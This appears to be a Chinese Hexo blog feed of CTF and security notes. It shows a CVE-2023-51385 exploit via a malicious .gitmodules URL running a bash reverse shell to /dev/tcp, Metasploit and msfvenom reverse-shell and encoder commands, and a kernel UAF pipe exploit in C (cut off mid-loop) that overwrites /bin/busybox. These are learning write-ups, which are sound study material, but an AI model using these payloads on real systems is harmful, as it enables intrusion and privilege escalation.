<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">t1 = <span class="built_in">list</span>(<span class="string">&quot;abcdefghijklmnopqrstuvwxyz1234567890ABCDEF&quot;</span>)</span><br><span class="line">r1 = <span class="built_in">list</span>(<span class="string">&quot;aeimquy37AEbdfhjlnprtvxz24680BDFcgkosw159C&quot;</span>)</span><br><span class="line"></span><br><span class="line">t2 = <span class="string">&quot;flag&#123;abcdefghijklmnopqrstuvwxyz1234567890&#125;&quot;</span></span><br><span class="line">r2 = <span class="string">&quot;f&#123;dhlptx260lgacegikmoqsuwy13579&#125;abfjnrvz48&quot;</span></span><br><span class="line"></span><br><span class="line">mapping = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, c in <span class="built_in">enumerate</span>(t1):</span><br><span class="line">    <span class="keyword">for</span> j, v in <span class="built_in">enumerate</span>(r1):</span><br><span class="line">        <span class="keyword">if</span> c == v:</span><br><span class="line">            mapping[i] = j</span><br><span class="line"><span class="built_in">print</span>(mapping)</span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">42</span>):</span><br><span class="line">    assert t2[i] == r2[mapping[i]]</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">list</span>(<span class="string">&quot;f&#123;52bgb-281lg00ff-46f7-ca009c8e&#125;a381-b7191&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">for</span> i in <span class="title">range</span><span class="params">(<span class="number">42</span>)</span>:</span></span><br><span class="line"><span class="function">    print(flag[mapping[i]], end=</span><span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="modules"><a href="#modules" class="headerlink" title="modules"></a>modules</h2><p>CVE-2023-51385<del>（gitee 搜索就有答案</del></p>
<p>如何利用看下面两篇文章就行</p>
<ul>
<li><a href="https://blog.csdn.net/mirocky/article/details/135485164">CVE-2023-51385 OpenSSH ProxyCommand命令注入漏洞</a></li>
<li><a href="https://vin01.github.io/piptagole/ssh/security/openssh/libssh/remote-code-execution/2023/12/20/openssh-proxycommand-libssh-rce.html">SSH ProxyCommand  (CVE-2023-51385）</a></li>
</ul>
<p>新建一个 <code>gitee</code> 仓库，添加一个 <code>.gitmodules</code> 文件，反弹shell。后面的域名需要与 <code>.config</code> 文件一致</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[submodule &quot;cves&quot;]</span><br><span class="line">  path = cves</span><br><span class="line">  url = ssh://`bash exp.sh`foo.ichunqiu.com/bar</span><br></pre></td></tr></table></figure>

<p>在库里创建一个 <code>exp.sh</code> 文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>clone 仓库触发漏洞</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> &lt;repo&gt; --recurse-submodules</span><br></pre></td></tr></table></figure>

<p>比赛时 curl 主机没有回显，在赛后才想到可能是<code>VPS 防火墙</code>的问题</p>
<ul>
<li>然后curl了一下vps，发现没有接收到，后来又发现 4444 端口不行，换成 9999 端口就行😥</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ufw allow port</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>init-blog</title>
    <url>/2023/03/19/init-blog/</url>
    <content><![CDATA[<blockquote>
<p>blog init</p>
</blockquote>
<span id="more"></span>

<h1 id="搭建博客"><a href="#搭建博客" class="headerlink" title="搭建博客"></a>搭建博客</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ul>
<li>github + hexo</li>
</ul>
<!--more-->

<h3 id="hexo使用"><a href="#hexo使用" class="headerlink" title="hexo使用"></a>hexo使用</h3><ul>
<li><p><code>hexo</code> 命令报错，上网查，使用 <code>npx hexo</code></p>
</li>
<li><p>插件下载</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install --save hexo-deployer-git</span><br></pre></td></tr></table></figure>

<ul>
<li>常用命令</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npx hexo init <span class="comment"># 初始化一个仓库</span></span><br><span class="line">npx hexo clean</span><br><span class="line">npx hexo g   <span class="comment"># 静态界面生成</span></span><br><span class="line">npx hexo s   <span class="comment"># 本地启动 service</span></span><br><span class="line">npx hexo d   <span class="comment"># 插件。传到github</span></span><br><span class="line"></span><br><span class="line">npx hexo new page &lt;name&gt; <span class="comment"># 生成目录</span></span><br><span class="line">npx hexo new &lt;name&gt;.md   <span class="comment">#生成文章</span></span><br></pre></td></tr></table></figure>

<ul>
<li>常用属性</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">title: 标题， 使用 &#123;&#123;title&#125;&#125;</span><br><span class="line"><span class="built_in">date</span>: 日期, 使用 &#123;&#123;<span class="built_in">date</span>&#125;&#125;</span><br><span class="line">updated: 更新</span><br><span class="line">tags: 标签</span><br><span class="line">categories: 分类</span><br><span class="line">comments: 开启评论 <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<h3 id="本地"><a href="#本地" class="headerlink" title="本地"></a>本地</h3><ul>
<li>obsidian 写md</li>
<li>vscode</li>
</ul>
<h2 id="持续学习"><a href="#持续学习" class="headerlink" title="持续学习"></a>持续学习</h2><ul>
<li>简单点也还行，不想折腾了。</li>
<li>官网 + google，满足一切要求</li>
</ul>
<p><a href="https://hexo.io/zh-cn/docs/">中文文档</a></p>
]]></content>
      <categories>
        <category>MISC</category>
      </categories>
      <tags>
        <tag>blog</tag>
      </tags>
  </entry>
  <entry>
    <title>msf</title>
    <url>/2024/01/31/msf/</url>
    <content><![CDATA[<blockquote>
<p>Metasploit Framework 简单用用</p>
</blockquote>
<span id="more"></span>

<h2 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole"></a>msfconsole</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ msfconsole</span><br><span class="line">msf6 &gt; search ms17_010                                                      <span class="comment"># 寻找相关</span></span><br><span class="line">msf6 &gt; use 1                                                                <span class="comment"># search出的结果</span></span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; show payloads                   <span class="comment"># 显示可以使用的payloads</span></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; show options                    <span class="comment"># exploit 参数</span></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; <span class="built_in">set</span> LHOST 192.168.41.148        <span class="comment"># 设置参数</span></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; exploit</span><br></pre></td></tr></table></figure>

<p>meterpreter 操作</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter&gt; shell</span><br><span class="line">meterpreter&gt; background      <span class="comment"># 返回msf</span></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; session -l    <span class="comment"># 显示所有的session `session 0` 重新 attach</span></span><br></pre></td></tr></table></figure>

<h2 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h2><p>后门生成，免杀</p>
<p>寻找payload</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ msfvenom -l payload | grep linux</span><br><span class="line">$ msfvenom -p linux/x86/meterpreter/reverse_tcp --list-options</span><br></pre></td></tr></table></figure>

<p>生成shellcode</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -p: payload</span></span><br><span class="line"><span class="comment"># -a: arch</span></span><br><span class="line"><span class="comment"># -f: format</span></span><br><span class="line">$ msfvenom -p linux/x86/meterpreter/reverse_tcp -a x86 --platform=linux LHOST=127.0.0.1 LPORT=9001 -f c</span><br></pre></td></tr></table></figure>

<p>encoder：可以过掉部分waf</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ msfvenom --list encoders</span><br><span class="line"><span class="comment"># -e: encoder</span></span><br><span class="line"><span class="comment"># -i: iterations，编码多次</span></span><br><span class="line">$ msfvenom -e php/base64 -i 10  </span><br></pre></td></tr></table></figure>

<h2 id="other"><a href="#other" class="headerlink" title="other"></a>other</h2><p>生成随机字符串</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ msf-pattern_create -l 100</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CSE</category>
      </categories>
      <tags>
        <tag>msf</tag>
      </tags>
  </entry>
  <entry>
    <title>mimic water-ker</title>
    <url>/2023/11/11/mimic%20water-ker/</url>
    <content><![CDATA[<blockquote>
<p>差点抄明白了</p>
</blockquote>
<span id="more"></span>

<h2 id="water-ker"><a href="#water-ker" class="headerlink" title="water-ker"></a>water-ker</h2><p>内核题目，权限正确，保护全开，唯一不好的就是没有提供 <code>.config</code> 文件</p>
<p>运行时保护全开，查看 LKM</p>
<ul>
<li>创建一个chunk。</li>
<li>可以free，并且存在UAF。</li>
<li>可以 edit 1字节。</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">water_ioctl</span><span class="params">(file *file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbp</span></span><br><span class="line">  __int64 arg_; <span class="comment">// rdx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  edit_args args; <span class="comment">// [rsp+0h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+10h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  v8 = v3;</span><br><span class="line">  v7 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  result = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">switch</span> ( cmd )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x30</span>u:</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">copy_from_user</span>(&amp;args, arg_, <span class="number">8LL</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( delete_idx &lt;= <span class="number">0</span> &amp;&amp; chunk )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">kfree</span>();                              <span class="comment">// uaf dangling pointer</span></span><br><span class="line">                                                <span class="comment">// chunk = 0</span></span><br><span class="line">          ++delete_idx;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x50</span>u:</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">copy_from_user</span>(&amp;args, arg_, <span class="number">8LL</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( edit_idx &lt;= <span class="number">0</span> &amp;&amp; chunk &amp;&amp; !<span class="built_in">copy_from_user</span>(chunk, args.buf, <span class="number">1LL</span>) )<span class="comment">// pipe pages</span></span><br><span class="line">        &#123;</span><br><span class="line">          ++edit_idx;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x20</span>u:</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">copy_from_user</span>(&amp;args, arg_, <span class="number">8LL</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !chunk )</span><br><span class="line">        &#123;                                       <span class="comment">// void *kmalloc_trace(struct kmem_cache *s, gfp_t flags, size_t size)</span></span><br><span class="line">          chunk = (<span class="type">unsigned</span> __int8 *)<span class="built_in">kmalloc_trace</span>(kmalloc_caches[<span class="number">51</span>], <span class="number">4197568LL</span>, <span class="number">0x200</span>LL);</span><br><span class="line">          <span class="keyword">if</span> ( chunk )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">copy_from_user</span>(chunk, args.buf, <span class="number">0x200</span>LL);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>chunk的flag，不是 <code>SLAB_ACCOUNT 0x04000000</code>，因此是 通用slab。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">chunk = (<span class="type">unsigned</span> __int8 *)<span class="built_in">kmalloc_trace</span>(kmalloc_caches[<span class="number">51</span>], <span class="number">0x400CC0</span>LL, <span class="number">0x200</span>LL);</span><br></pre></td></tr></table></figure>

<p>思路是使用 pipe 结构体的 page 指针，造成任意读写。</p>
<ul>
<li>fcntl 修改 pipe 的size从而可以获得0x200大小的 <code>pipe_bufs ring</code></li>
<li>uaf 修改 <code>pipe_buffer-&gt;pages</code> 使两个page指针指向同一个内存</li>
<li>free 一个 page 可以使用另一个page任意读写</li>
<li>堆喷射提高成功率</li>
<li>page 使用kmalloc-64。0x40</li>
</ul>
<p>gdb调试，使用脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># gdbscript</span><br><span class="line">file vmlinux  # 需要先去除 kaslr 否则地址偏移不对，无法debug</span><br><span class="line">target remote :1234</span><br><span class="line"></span><br><span class="line"># cmd</span><br><span class="line">gdb -x gdbscript</span><br></pre></td></tr></table></figure>

<h3 id="page-level-uaf"><a href="#page-level-uaf" class="headerlink" title="page-level-uaf"></a>page-level-uaf</h3><p>pipe 结构体<code>struct pipe_inode_info (size ?= 0x88)</code> 成员 <code>pipe-&gt;bufs</code>  的成员默认为 10(pipe_bufs &amp;&amp; ring_size)个 <code>struct pipe_buffer</code> ，此结构体第一个成员变量为 <code>struct page *page</code></p>
<ul>
<li>堆喷射大量的pipe，然后使用 <code>pipe_fcntl</code> 修改  <code>ring_size</code>  的大小，让 <code>pipe-&gt;bufs</code> 处于 kmalloc-512。</li>
<li>将部分的 <code>pipe_bufs</code> 修改大，这样会获得比较多的 free 掉的 kmalloc-512</li>
<li>添加chunk然后free掉，处于kmalloc-512。</li>
<li>使用<code>fcntl</code> 将改大的 <code>pipe_bufs</code> 改回 kmalloc-512。</li>
<li>往pipe中写内容，<code>alloc_pages</code> 获得页。</li>
<li>因为存在uaf，edit 修改page指针的最后一个字节，使两个 pipe （victim, origin） 指向相同的 struct page</li>
<li><code>struct page</code> 的大小约为 0x40，直接修改 <code>\x00</code> 成功率 <code>75%</code>。0x100 &#x2F; 0x40 &#x3D; 4，可能根本就没修改，存在失败的可能性。</li>
</ul>
<p>如果我们 close origin pipe ，可以获得 uaf 的 page</p>
<h3 id="二级-page-level-uaf-构造自写管道"><a href="#二级-page-level-uaf-构造自写管道" class="headerlink" title="二级 page-level-uaf 构造自写管道"></a>二级 page-level-uaf 构造自写管道</h3><p>上一步close后，存在一个存在 uaf 的 page，我们几乎可以任意读写。这里我们可以继续使用 <code>pipe_buffer</code> 结构体，在close pipe。</p>
<ul>
<li>堆喷大量的 pipe</li>
<li>close origin pipe，获得 free page 1</li>
<li>fcntl 修改大小，总有在free page 1 的 pipe，我们可以使用 victim 读取内容，获得page 1上的pipe内容</li>
<li>然后对 free page 1上的 pipe_buffer 进行 类似 uaf 写一字节的效果，使 page 1 的两个 pipe_buffer 的 page 指向同一个地方</li>
<li>free page 1 的其中一个 pipe，获得一个 uaf 的 free page 2</li>
<li>使用 pipe_buffer 进行获取，进行读写，但是这里修改free page 2 pipe_buffer page指针为  free page 1 的pipe_buffer 的 page。</li>
</ul>
<p>来自a3✌博客的原图。</p>
<p><img src="https://s2.loli.net/2023/05/02/TYr8WlEushem2i3.png" alt="二级自写管道"></p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>读写管道内容：需要先往管道中写内容，才能读取管道内容。这是 <code>struct pipe_buffer</code> 本身的属性  <code>offset &amp; len</code> 决定的。</p>
<ul>
<li>offset 开始读取，最多读len长度</li>
<li>从 offset + len 地方开始写内容</li>
</ul>
<p>为什么选择 96 和 192 的 size</p>
<ul>
<li>kmalloc存在这两个大小的 kmem_cache。</li>
<li>这两个size在 kmalloc 中也是比较独特的存在，不是2的幂次方，但是内核中很多的结构体大小类似，因此专门存在这两个size</li>
</ul>
<p>kfree 没有size参数？先找page 结构体，不是 slab page 就释放 page，是slab page 释放 object 大小的内容</p>
<h4 id="pipe-primitive"><a href="#pipe-primitive" class="headerlink" title="pipe primitive"></a>pipe primitive</h4><p>dirty pipe ，大致就是 <code>struct pipe_buffer</code> 的 flag 存在一个属性： <code>PIPE_BUF_FLAG_CAN_MERGE</code> ，结合 <code>splice</code> 0拷贝，可以写入<strong>任意可读文件</strong>。</p>
<p>我们主要思路就是：改pipe的flag，实现不依赖地址的内核提权。</p>
<p>在内核提权过程中，覆盖 <code>/bin/busybox</code> 文件，可以写二级制shellcode 或者 bash 脚本，随便执行命令就行，因为都是 busybox 的 link。</p>
<ul>
<li>问题：如果shell写成 <code>/bin/cat /flag</code> ，因为我们改了busybox实现，会出现 <code>Too many levels of symbolic links</code> 的错误提示</li>
<li>别忘记关闭文件描述符🤣。</li>
<li>还有的问题就写在注释里了</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * musl-gcc water.c -static -masm=intel -o exp</span></span><br><span class="line"><span class="comment"> * strip exp</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_SPRAY_NUMS 120</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SND_PIPE_SPRAY_NUMS 80</span></span><br><span class="line"><span class="comment">// kmalloc-cg-96</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SND_PIPE_BUFS_SIZE 96</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_BUF_FLAG_CAN_MERGE 0x10</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_info(fmt, ...) \</span></span><br><span class="line"><span class="meta">  dprintf(2, <span class="string">&quot;\033[32m[+] &quot;</span> fmt <span class="string">&quot;\033[0m\n&quot;</span>, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">page</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_inode_info</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_buf_operations</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_buffer</span> &#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">page</span> *page;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line">  <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">pipe_buf_operations</span> *ops;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_buf_operations</span> &#123;</span><br><span class="line">  <span class="built_in">int</span> (*confirm)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">  <span class="built_in">void</span> (*release)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">  <span class="built_in">int</span> (*try_steal)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">  <span class="built_in">int</span> (*get)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> kernel_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="type">size_t</span> kernel_offset = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> spray_pipe_fd[PIPE_SPRAY_NUMS][<span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> dev_fd;</span><br><span class="line"><span class="type">int</span> victim_idx = <span class="number">-1</span>, origin_idx = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> target_file[] = <span class="string">&quot;/bin/busybox&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> payload[] = <span class="string">&quot;#!/tmp/sh\n /tmp/cat /flag\n&quot;</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_buffer</span> info_pipe_buf = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">water_args</span> &#123;</span><br><span class="line">  <span class="type">char</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">new_chunk</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">char</span> buffer[<span class="number">512</span>];</span><br><span class="line">  <span class="built_in">memset</span>(buffer, <span class="number">0x44</span>, <span class="built_in">sizeof</span>(buffer));</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">water_args</span> arg = &#123;</span><br><span class="line">      .buf = buffer,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">ioctl</span>(dev_fd, <span class="number">0x20</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">delete_chunk</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">water_args</span> arg = &#123;</span><br><span class="line">      .buf = <span class="literal">NULL</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">ioctl</span>(dev_fd, <span class="number">0x30</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">edit_chunk</span><span class="params">(<span class="type">char</span> c)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">water_args</span> arg = &#123;</span><br><span class="line">      .buf = &amp;c,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">ioctl</span>(dev_fd, <span class="number">0x50</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[-] error: %s&quot;</span>, msg);</span><br><span class="line">  <span class="built_in">sleep</span>(<span class="number">5</span>);</span><br><span class="line">  <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">debug</span><span class="params">(<span class="type">char</span> *msg)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(msg);</span><br><span class="line">  <span class="built_in">getchar</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">page_level_uaf</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;spray pipe&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">pipe</span>(spray_pipe_fd[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">err_exit</span>(<span class="string">&quot;pipe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;change ring_size make pipe-&gt;bufs kmalloc-512 &quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i ++) &#123;</span><br><span class="line">    <span class="built_in">fcntl</span>(spray_pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">8</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;kmalloc-512 hole&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i += <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="built_in">fcntl</span>(spray_pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">16</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;new chunk then free&quot;</span>);</span><br><span class="line">  <span class="built_in">new_chunk</span>();</span><br><span class="line">  <span class="built_in">debug</span>(<span class="string">&quot;write chunk data D&quot;</span>);</span><br><span class="line">  <span class="built_in">delete_chunk</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;fill the hole&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i += <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="built_in">fcntl</span>(spray_pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">8</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;alloc pipe_buffer pages&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;deadbeef&quot;</span>, <span class="number">0x8</span>);</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;deadbeef&quot;</span>, <span class="number">0x8</span>);</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;deadbeef&quot;</span>, <span class="number">0x8</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;uaf change pipe-&gt;bufs-&gt;page&quot;</span>);</span><br><span class="line">  <span class="built_in">edit_chunk</span>(<span class="number">0x00</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;find victim pipe&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; 